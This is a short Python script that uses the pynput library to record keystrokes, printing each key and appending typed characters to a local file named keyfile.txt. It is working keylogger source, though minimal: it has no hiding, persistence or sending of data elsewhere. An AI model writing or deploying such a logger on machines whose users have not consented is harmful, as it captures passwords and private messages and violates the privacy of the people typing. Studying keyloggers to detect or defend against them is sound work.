from pynput import keyboard
def keypressed(key):
    try:
        char = key.char
        print(char)
        with open("keyfile.txt", "a") as logkey:
            logkey.write(char)
    except AttributeError:
        # Handle non-character keys (e.g., special keys)
        print(f"Special key pressed: {key}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()